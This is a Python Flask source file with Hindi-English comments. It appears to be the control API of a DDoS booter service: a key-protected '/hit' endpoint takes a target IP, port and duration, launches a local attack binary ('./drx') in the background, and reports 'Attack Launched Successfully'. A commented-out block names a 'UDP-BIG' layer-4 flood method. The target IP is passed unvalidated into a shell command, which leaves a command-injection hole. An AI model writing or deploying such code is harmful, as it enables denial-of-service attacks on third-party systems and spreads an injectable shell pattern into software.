from flask import Flask, request, jsonify
import subprocess
import os

app = Flask(__name__)

# - Security Key taaki koi aur tumhari API use na kar sake
API_AUTH_TOKEN = "DRX_POWER_ULTRA_V4"

@app.route('/hit', methods=['GET'])
def start_attack():
    # Auth Check
    key = request.args.get('key')
    if key != API_AUTH_TOKEN:
        return jsonify({"status": "error", "message": "Unauthorized Access"}), 403

    # - Parameters from Bot/App
    target_ip = request.args.get('ip')
    target_port = request.args.get('port')
    duration = request.args.get('time', "240") # Default string format mein rakhein

    if not target_ip or not target_port:
        return jsonify({"status": "error", "message": "Missing IP or Port"}), 400

    # Input Validation: Check karein ki IP aur Port valid numbers/format mein hain
    # Taaki koi command injection na kar sake
    if not target_port.isdigit() or not duration.isdigit():
        return jsonify({"status": "error", "message": "Invalid Port or Time format"}), 400

    try:
        # - Binary ko background mein trigger karna
        # ./drx ka path absolute ya relative check karein (ensure chmod +x drx kiya hai)
        command = f"nohup ./drx {target_ip} {target_port} {duration} > /dev/null 2>&1 &"
        
        # subprocess.Popen use karna sahi hai background execution ke liye
        subprocess.Popen(command, shell=True)
        
        return jsonify({
               "success": True,
               "data":{
                    "message": "Attack Launched Successfully",
                    "host": target_ip,
                    "port": target_port,
                    "time": duration,
                    "vps_status": "32GB_POWER_MAX"
                #"status": "success"
                }
            })
        '''
       return jsonify({
            "success": True,
            "data": {
                "id": attack_id,
                "target": target_ip,
                "port": target_port,
                "duration": duration,
                "customId": None,
                "stopped": False,
                "createdAt": created_at.isoformat() + "Z",
                "expiresAt": expires_at.isoformat() + "Z",
                "secondsRemaining": duration,
                "method": {
                    "id": 30,
                    "name": "UDP-BIG",
                    "description": "",
                    "layer": 4
                }
            },
            "message": "Started 1 test(s) successfully.",
            "errors": None
        }) 
'''
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == '__main__':
    # - Port 8080 par API live hogi
    app.run(host='0.0.0.0', port=8080, debug=False)
